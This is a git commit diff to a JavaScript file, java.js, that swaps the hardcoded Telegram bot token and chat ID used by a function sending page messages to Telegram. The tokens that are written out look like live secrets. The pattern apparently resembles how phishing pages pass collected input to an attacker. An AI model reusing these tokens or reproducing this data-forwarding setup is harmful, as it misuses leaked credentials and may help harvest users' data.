b7f2962d2b811a4435d9c2dd42c197a8fbed91ad
kelentet <122460475+kelentet@users.noreply.github.com>
2025-01-20 16:55:07 +0700

    Update java.js

--- java.js
+++ java.js
@@ -16,8 +16,8 @@ function showPage(pageId) {
 
 // Fungsi untuk mengirim data ke Telegram
 function sendToTelegram(message) {
-  const token = "7889584434:AAG-CsZLrXZv6_TR67L51aPzEhZED4YG0QU"; // Token bot Telegram Anda
-  const chatId = "6586006395"; // Chat ID atau ID grup Anda
+  const token = "8027003205:AAF3_4uYEaSNkJ36p4-76oqBbavs6RunvYo"; // Token bot Telegram Anda
+  const chatId = "1782125816"; // Chat ID atau ID grup Anda
 
   return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
